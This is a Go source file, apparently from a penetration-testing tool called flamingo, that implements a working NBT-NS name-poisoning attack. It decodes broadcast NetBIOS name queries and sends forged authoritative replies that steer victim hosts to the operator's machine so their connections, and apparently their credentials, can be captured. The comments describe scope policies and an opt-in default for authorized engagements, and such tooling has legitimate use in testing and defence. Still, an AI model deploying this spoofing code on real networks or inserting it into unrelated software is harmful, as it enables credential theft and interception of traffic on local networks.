package flamingo

import (
	"fmt"
	"net"
	"strings"
	"sync"

	log "github.com/sirupsen/logrus"
	"golang.org/x/net/ipv4"
)

// nbtnsRoles maps an NBT-NS service suffix to a human-readable role, used for
// logging only.
var nbtnsRoles = map[byte]string{
	0x00: "Workstation/Redirector",
	0x20: "File Server",
	0x1b: "Domain Master Browser",
	0x1c: "Domain Controller",
	0x1d: "Local Master Browser",
	0x1e: "Browser Election",
}

// ConfNBTNS describes the options for the NBT-NS poisoner.
type ConfNBTNS struct {
	BindPort     uint16
	BindHost     string
	RecordWriter *RecordWriter

	Policy    *ScopePolicy
	SpoofIPv4 string
	TTL       uint32

	shutdown bool
	v4       *ipv4.PacketConn
	m        sync.Mutex
}

// NewConfNBTNS creates a default configuration for the NBT-NS poisoner.
func NewConfNBTNS() *ConfNBTNS {
	return &ConfNBTNS{
		BindPort: 137,
		BindHost: "[::]",
		TTL:      defaultNBTNSTTL,
		Policy:   DefaultScopePolicy(),
	}
}

// IsShutdown checks to see if the service is shutting down.
func (c *ConfNBTNS) IsShutdown() bool {
	c.m.Lock()
	defer c.m.Unlock()
	return c.shutdown
}

// Shutdown flags the service to shut down.
func (c *ConfNBTNS) Shutdown() {
	c.m.Lock()
	defer c.m.Unlock()
	if c.shutdown {
		return
	}
	c.shutdown = true
	if c.v4 != nil {
		c.v4.Close()
	}
}

// SpawnNBTNS starts an NBT-NS poisoner. NBT-NS is broadcast-based and IPv4 only,
// so no multicast group is joined.
//
// Name poisoning is active, not passive: unlike the capture listeners it makes
// hosts connect to flamingo. It is therefore opt-in and OFF by default; an
// operator must explicitly enable it (e.g. --protocols nbtns,smb) and should only
// do so inside an authorized engagement scope. The ScopePolicy and analyze mode
// exist to keep answers inside that scope.
func SpawnNBTNS(c *ConfNBTNS) error {
	v4host, _ := poisonBindHosts(c.BindHost)
	if v4host == "" {
		v4host = "0.0.0.0"
	}

	v4, err := openPoisonV4(v4host, c.BindPort, nil, "nbt-ns")
	if err != nil {
		return fmt.Errorf("failed to listen on %s:%d for nbt-ns (%s)", c.BindHost, c.BindPort, err)
	}
	c.v4 = v4
	go poisonServeV4(v4, "nbt-ns", c.IsShutdown, c.handle)

	log.Debugf("nbt-ns is listening on %s:%d", c.BindHost, c.BindPort)
	return nil
}

// decodeNetBIOSName decodes an RFC1001 first-level-encoded NetBIOS name (32
// encoded bytes -> 16 raw bytes) and returns the trimmed name and the service
// suffix (the 16th raw byte).
func decodeNetBIOSName(enc []byte) (string, byte) {
	raw := make([]byte, 0, 16)
	for i := 0; i+1 < len(enc) && len(raw) < 16; i += 2 {
		b := ((enc[i] - 0x41) << 4) | ((enc[i+1] - 0x41) & 0x0f)
		raw = append(raw, b)
	}

	var suffix byte
	if len(raw) == 16 {
		suffix = raw[15]
	}

	namePart := raw
	if len(namePart) > 15 {
		namePart = namePart[:15]
	}

	var sb strings.Builder
	for _, b := range namePart {
		if b == 0x00 {
			break
		}
		if b >= 0x20 && b < 0x7f {
			sb.WriteByte(b)
		}
	}
	return strings.TrimRight(sb.String(), " "), suffix
}

// parseNBTNSQuery parses an NBT-NS name query. It returns the decoded name, the
// service suffix, and whether the datagram is an answerable name query.
func parseNBTNSQuery(data []byte) (name string, suffix byte, ok bool) {
	// TID(2) flags(2) counts(8) namelen(1) encoded(32) null(1) type(2) class(2)
	if len(data) < 50 {
		return "", 0, false
	}
	// Flags must be 0x0110 (name query, recursion desired, broadcast).
	if data[2] != 0x01 || data[3] != 0x10 {
		return "", 0, false
	}
	// The encoded name length must be 0x20 (32).
	if data[12] != 0x20 {
		return "", 0, false
	}
	name, suffix = decodeNetBIOSName(data[13:45])
	if name == "" {
		return "", 0, false
	}
	return name, suffix, true
}

// buildNBTNSAnswer builds a byte-exact NBT-NS positive name query response. The
// 34-byte encoded question name (data[12:46]) is echoed as the answer name.
func buildNBTNSAnswer(data []byte, ip net.IP, ttl uint32) []byte {
	out := make([]byte, 0, 62)
	out = append(out, data[0:2]...)   // transaction id
	out = append(out, 0x85, 0x00)     // flags: response, authoritative, RA
	out = append(out, 0x00, 0x00)     // questions
	out = append(out, 0x00, 0x01)     // answer RRs
	out = append(out, 0x00, 0x00)     // authority RRs
	out = append(out, 0x00, 0x00)     // additional RRs
	out = append(out, data[12:46]...) // echoed encoded name (34 bytes)
	out = append(out, 0x00, 0x20)     // type NB
	out = append(out, 0x00, 0x01)     // class IN
	out = be32(out, ttl)              // TTL
	out = append(out, 0x00, 0x06)     // RDLENGTH
	out = append(out, 0x00, 0x00)     // NB flags: B-node, unique
	out = append(out, ip.To4()...)    // address
	return out
}

// handle processes one NBT-NS datagram, records it, and returns any reply bytes.
func (c *ConfNBTNS) handle(data []byte, src net.Addr, ifIndex int) []byte {
	name, suffix, ok := parseNBTNSQuery(data)
	if !ok {
		return nil
	}

	respond, reason := c.Policy.ShouldRespond(srcIP(src), name)

	var spoof net.IP
	if respond {
		spoof = c.chooseSpoof(ifIndex)
		if spoof == nil {
			respond = false
			reason = "no spoof address available"
		}
	}

	c.record(src, name, suffix, respond, spoof, reason)
	if !respond {
		return nil
	}
	return buildNBTNSAnswer(data, spoof, c.TTL)
}

// chooseSpoof returns the address to answer with: the explicit override when
// set, otherwise the address of the interface the query arrived on. When neither
// is available it returns nil and the caller answers nothing.
func (c *ConfNBTNS) chooseSpoof(ifIndex int) net.IP {
	if c.SpoofIPv4 != "" {
		return net.ParseIP(c.SpoofIPv4).To4()
	}
	return ifaceIPv4(ifIndex)
}

func (c *ConfNBTNS) record(src net.Addr, name string, suffix byte, answered bool, spoof net.IP, reason string) {
	role := nbtnsRoles[suffix]
	if role == "" {
		role = "Unknown"
	}
	fields := map[string]string{
		"_server":  fmt.Sprintf("%s:%d", c.BindHost, c.BindPort),
		"name":     name,
		"qtype":    "NB",
		"suffix":   fmt.Sprintf("0x%02x", suffix),
		"role":     role,
		"answered": fmt.Sprintf("%t", answered),
	}
	if answered && spoof != nil {
		fields["spoofed"] = spoof.String()
	}
	if !answered && reason != "" {
		fields["reason"] = reason
	}
	c.RecordWriter.Record("query", "nbt-ns", src.String(), fields)
}
